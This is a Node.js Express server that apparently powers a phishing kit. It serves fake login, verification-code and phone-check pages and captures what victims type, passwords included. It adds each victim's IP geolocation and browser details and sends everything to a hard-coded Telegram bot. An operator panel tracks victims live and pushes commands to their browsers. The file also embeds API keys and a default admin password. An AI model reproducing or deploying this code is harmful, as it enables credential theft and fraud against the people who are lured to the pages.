const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const { sendMessageFor } = require('simple-telegram-message');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs').promises;
const session = require('express-session');

const app = express();
const port = process.env.PORT || 3000;

// Constants for API details
const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const botToken = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
const chatId = "5200289419";

app.use(session({
    secret: "3f73f14e9b29c8f5a6c1d3ee67d2a8a42a99e02e3f5b678d3d6a81f96b4873a2",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false } // Set to true if using HTTPS
}));

app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Initialize SQLite database
const db = new sqlite3.Database(':memory:');

// Insert default admin credentials
const defaultUsername = 'admin';
const defaultPassword = 'updateteam'; // Remember to hash passwords for security
const hashedPassword = crypto.createHash('sha256').update(defaultPassword).digest('hex');

db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
  db.run("CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, stats TEXT)");
  db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");
  
    db.get("SELECT * FROM admin WHERE username = ?", [defaultUsername], (err, row) => {
        if (err) {
            console.error(`Error checking admin: ${err.message}`);
            return;
        }
        if (!row) {
            // Insert default admin credentials if they don't already exist
            db.run("INSERT INTO admin (username, password) VALUES (?, ?)", [defaultUsername, hashedPassword], (err) => {
                if (err) {
                    console.error(`Error inserting default admin credentials: ${err.message}`);
                } else {
                    console.log('Default admin credentials inserted successfully');
                }
            });
        } else {
            console.log('Default admin credentials already exist');
        }
    });
});


let visitors = 0;
let humans = 0;
let bots = 0;
let stats = '';
let clients = {};
let adminClient = null;
let currPage = "";
let message = '';
function resetVisits(){
    visitors = 0;
}



function addClientToDatabase(clientId, ip) {
    visitors++;
    humans++;
    db.run("INSERT INTO clients (id, inputs, ip) VALUES (?, ?, ?)", [clientId, JSON.stringify({}), ip], (err) => {
        if (err) {
            console.error(`Error adding client ${clientId}: ${err.message}`);
        } else {
            console.log(`Client ${clientId} with IP ${ip} added to the database`);
        }
    });
}

function addStatsToDatabase(stats) {
    db.run("INSERT INTO stats (stats_json) VALUES (?)", [stats], (err) => {
        if (err) {
            console.error(`Error adding stats: ${err.message}`);
        } else {
            console.log(`Stats added to the stats table`);
        }
    });
}

function removeClientFromDatabase(clientId) {
    db.run("DELETE FROM clients WHERE id = ?", [clientId], (err) => {
        if (err) {
            console.error(`Error removing client ${clientId}: ${err.message}`);
        } else {
            console.log(`Client ${clientId} removed from the database`);
        }
    });
}

function updateClientInputs(clientId, inputs) {
    db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
        if (err) {
            console.error(`Error updating inputs for client ${clientId}: ${err.message}`);
        }
    });
}

function getClientData(callback) {
    db.all("SELECT * FROM clients", (err, rows) => {
        if (err) {
            console.error(`Error retrieving client data: ${err.message}`);
            callback([]);
        } else {
            callback(rows.map(row => ({ clientId: row.id, inputs: JSON.parse(row.inputs), ip: row.ip })));
        }
    });
}


function broadcastAdminPanel(currPage, stats) {
    getClientData((clientList) => {
         stats = { visitors, humans, bots };
         currPage = {currPage};
        //stats = JSON.stringify(stats); // Update stats globally
		console.log(stats);
        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats }); 
        console.log(`Broadcasting to admin panel: ${message}`);
        if (adminClient) {
            adminClient.write(`data: ${message}\n\n`);
        } else {
            console.log('No admin client connected');
        }
    });
}

app.get('/forgot', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'reset.html'));
});

app.post('/forgot', (req, res) => {
    const { apiKey, username, newPassword } = req.body;
    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');

    db.get("SELECT * FROM api_keys WHERE key = ?", [apiKey], (err, row) => {
        if (err) {
            console.error(`Error retrieving API key: ${err.message}`);
            return res.status(500).send('Error verifying API key');
        }
        if (row) {
            db.get("SELECT * FROM admin WHERE username = ?", [username], (err, row) => {
                if (err) {
                    console.error(`Error retrieving admin: ${err.message}`);
                    return res.status(500).send('Error retrieving admin');
                }
                if (row) {
                    db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
                        if (err) {
                            console.error(`Error updating password: ${err.message}`);
                            return res.status(500).send('Error updating password');
                        }
                        res.send('Password reset successfully');
                    });
                } else {
                    res.status(404).send('User not found');
                }
            });
        } else {
            res.status(401).send('Unauthorized: Invalid API key');
        }
    });
});

function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        const ips = xForwardedFor.split(',');
        return ips[0].trim();
    }
    return req.connection.remoteAddress || req.socket.remoteAddress || null;
}


    const sendAPIRequest = async (ipAddress) => {
        try {
            const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
            return apiResponse.data;
        } catch (error) {
            console.error(`Error fetching IP information: ${error.message}`);
            return null;
        }
    };

    
    //Command sec
    app.post('/delete-client', (req, res) => {
  const { clientId } = req.body;
  if (clientId) {
    // Remove the client from memory and database
    if (clients[clientId]) {
      clients[clientId].end(); // End the SSE connection
      delete clients[clientId];
    }
    removeClientFromDatabase(clientId);
    broadcastAdminPanel();
    res.sendStatus(200);
  } else {
    res.status(400).send('Missing clientId');
  }
});
    
app.post('/send-command', (req, res) => {
  const { clientId, command } = req.body;
  const client = clients[clientId];
  if (client) {
    client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
  }
  res.sendStatus(200);
});
//command sec end    


const HEARTBEAT_INTERVAL = 60000; // 30 seconds

app.post('/heartbeat', (req, res) => {
    const clientId = req.body.clientId;
    currPage = req.body.currPage;

    if (clients[clientId]) {
        // Reset the heartbeat timeout
        clearTimeout(clients[clientId].timeout);
        clients[clientId].timeout = setTimeout(() => {
            console.log(`No heartbeat received from client ${clientId}. Performing action.`);
            // Perform the desired action here
            //delete clients[clientId];
        }, HEARTBEAT_INTERVAL);
        res.send('true');
        broadcastAdminPanel(currPage, visitors);
    } else {
    	 currPage = "Disconnected";
    	broadcastAdminPanel(currPage, visitors);
        //res.status(404).send('Client not found');
    }
});


const MAX_RETRIES = 6;


async function retryConnection(clientId, retries = MAX_RETRIES) {
    while (retries > 0) {
        try {
            // Attempt to reconnect here. This could be a ping, an HTTP request, etc.
            console.log(`Attempting to reconnect to client ${clientId}... (${MAX_RETRIES - retries + 1}/${MAX_RETRIES})`);
            // If reconnect attempt is successful:
            return true; 
        } catch (error) {
            console.log(`Reconnection attempt ${MAX_RETRIES - retries + 1} failed for client ${clientId}`);
        }
        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
        retries--;
    }
    console.log(`Failed to reconnect to client ${clientId} after ${MAX_RETRIES} attempts.`);
    return false;
}



app.get('/events', (req, res) => {
    const clientId = req.query.clientId;
    const isAdmin = req.query.admin === 'true';
    const clientIp = getClientIp(req);
    
    if (currPage === undefined || currPage === null || currPage === "" || currPage === "Disconnected") {
        currPage = req.query.currPage || "defaultPage"; // Provide a default value if currPage is undefined, null, or an empty string
    }

    console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);

    if (clientId || isAdmin) {
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');

        if (clientId && !clients[clientId]) {
            addClientToDatabase(clientId, clientIp);
            clients[clientId] = res;
            console.log(`Client ${clientId} connected`);
        }

        if (isAdmin) {
            adminClient = res;
            console.log('Admin client connected');
        }

        req.on('close', async () => {
            if (clientId) {
                delete clients[clientId];
                console.log(`Client ${clientId} disconnected`);
                const reconnected = await retryConnection(clientId);
                if (!reconnected) {
                    console.log(`Unable to re-establish connection with client ${clientId}`);
                }
            }
            if (isAdmin) {
                adminClient = null;
                console.log('Admin client disconnected');
            }
            broadcastAdminPanel(currPage, visitors); // Pass currPage here
        });

        broadcastAdminPanel(currPage, stats); // Pass currPage here
    } else {
        res.status(400).send('Invalid clientId or admin query parameter');
    }
});


app.post('/input', async (req, res) => {
    try {
        const { clientId, currPage, inputs } = req.body;
		


        console.log('Received /input request:', req.body);
        const ipAddress = getClientIp(req);
        const ipAddressInformation = await sendAPIRequest(ipAddress);

        if (!clientId || typeof inputs !== 'object') {
            return res.status(400).send('Missing clientId or inputs object');
        }

        const row = await new Promise((resolve, reject) => {
            db.get("SELECT id, inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(row);
                }
            });
        });

        if (!row) {
        	console.log("no row");
            await addClientToDatabase(clientId, ipAddress);
        }

        const existingInputs = row ? JSON.parse(row.inputs) : {};
        const updatedInputs = { ...existingInputs, ...inputs };

        await updateClientInputs(clientId, updatedInputs);
        broadcastAdminPanel(currPage, stats);

        if (!ipAddressInformation) {
            return res.status(500).send('Error retrieving IP information');
        }

        const userAgent = req.headers["user-agent"];
        const systemLang = req.headers["accept-language"];
        //const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
		
			if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
			  `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
                
			  const inputKeys = Object.keys(inputs);
			
			  // Iterate over each key and access its corresponding value
			  inputKeys.forEach(key => {
			  	if (key === 'password') {
			  		message += `🌍 GEO-IP INFO\n` +
                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
                `CITY             : ${ipAddressInformation.location.city}\n` +
                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
                `💻 SYSTEM INFO\n` +
                `USER AGENT       : ${userAgent}\n` +
                `SYSTEM LANGUAGE  : ${systemLang}\n` +
                `💬 Telegram: https://t.me/UpdateTeams\n`;
				      return;
				    }
			    const value = inputs[key];
			    console.log(`${key}: ${value}\n`);
			    message += `${key}: ${value}\n`;
			    
			  });
			  const sendMessage = sendMessageFor(botToken, chatId);
            sendMessage(message);
            console.log(`message: ${message}`);
            
            } else {
			  console.log('Inputs are empty or not defined.');
			}
        
        
        res.sendStatus(200);
    } catch (error) {
        console.error(`Error processing request: ${error.message}`);
        res.sendStatus(500);
    }
});



app.post('/process-request', async (req, res) => {
    try {
    	
    } catch (error) {
        console.error(`Error processing request: ${error.message}`);
        res.sendStatus(500);
    }
});


// Setup session middleware


app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/code', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'entercode.html'));
});

app.get('/phone', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verifyphone.html'));
});

app.get('/load', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'loading.html'));
});

// Route to handle the login form submission
app.post('/admin', (req, res) => {
    const { username, password } = req.body;
    console.log('Received login request:', req.body);

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
    console.log('Hashed password:', hashedPassword);

    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedPassword], (err, row) => {
        if (err) {
            console.error(`Error retrieving admin: ${err.message}`);
            return res.status(500).send('Error retrieving admin');
        }
        if (row) {
            console.log(row);
            // Set the session variable
            req.session.loggedIn = true;
            // Redirect to the admin dashboard
            res.redirect('/admin/dashboard');
        } else {
            res.status(401).send('Unauthorized: Invalid username or password');
        }
    });
});

// Middleware to check if user is logged in
function checkAuth(req, res, next) {
    if (req.session.loggedIn) {
        return next();
    } else {
        res.status(401).send('Unauthorized: You need to log in first');
    }
}

app.get('/admin/dashboard', checkAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});


// Route to change the admin password
app.post('/change-password', (req, res) => {
    const { username, oldPassword, newPassword } = req.body;
    const hashedOldPassword = crypto.createHash('sha256').update(oldPassword).digest('hex');
    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');

    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedOldPassword], (err, row) => {
        if (err) {
            console.error(`Error retrieving admin: ${err.message}`);
            return res.status(500).send('Error retrieving admin');
        }
        if (row) {
            db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
                if (err) {
                    console.error(`Error updating password: ${err.message}`);
                    return res.status(500).send('Error updating password');
                }
                res.send('Password changed successfully');
            });
        } else {
            res.status(401).send('Unauthorized: Invalid username or old password');
        }
    });
});

const apiKeys = new Set(['your_api_key']);


// Endpoint to confirm API key
app.post('/confirm-api', (req, res) => {
    const { apiKey } = req.body;
    if (apiKeys.has(apiKey)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid API key' });
    }
});

app.post('/verify', async (req, res) => {
    const { email } = req.body;
    const apiKey = '59637b640cb0fcbdd080e2b52d6dbc0b9191a2a0e974c746ad9331d23450'; // Replace with your actual API key
    const url = `https://api.quickemailverification.com/v1/verify?email=${email}&apikey=${apiKey}`;

    try {
        // Make request to QuickEmailVerification API
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error('Failed to verify email');
        }

        const data = await response.json();

        // Check the result and disposable status from the API response
        if (data.result === 'valid' && data.disposable === 'false') {
        	console.log(email +" : "+ data);
            res.json({ success: true }); // Email is valid
        } else {
            res.json({ success: false }); // Email is invalid or disposable
        }
    } catch (error) {
        console.error('Error verifying email:', error);
        res.status(500).json({ success: false, error: 'Failed to verify email' });
    }
});


app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});